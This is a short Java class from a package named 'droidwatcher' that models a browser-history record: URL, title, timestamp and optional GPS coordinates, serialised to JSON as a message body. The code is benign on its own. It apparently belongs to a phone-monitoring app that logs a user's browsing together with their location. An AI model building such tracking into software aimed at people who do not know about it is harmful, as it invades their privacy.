package com.droidwatcher.lib;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import org.json.JSONException;
import org.json.JSONObject;

import com.droidwatcher.Debug;

public class BrowserHistory implements IMessageBody {	
	public long date;
	public String url;
	public String title;
	public double lat;
	public double lon;
	
	public BrowserHistory(long date, String url, String title, double lat, double lon){
		this.date = date;
		this.url = url;
		this.title = title;
		this.lat = lat;
		this.lon = lon;
	}

	public JSONObject getJSONObject() {
		JSONObject obj = new JSONObject();
		try {
			obj.put("date", date);
			obj.put("url", url);
			obj.put("title", title);
			
			if (lat != 0 && lon != 0) {
				obj.put("lat", lat);
				obj.put("lon", lon);
			}
			
		} catch (JSONException e) {
			Debug.exception(e);
		}
		return obj;
	}
	
	public String getStringDate(){
		return SimpleDateFormat.getDateTimeInstance(SimpleDateFormat.SHORT, SimpleDateFormat.SHORT, new Locale("ru","RU")).format(new Date(date));
	}
	
}
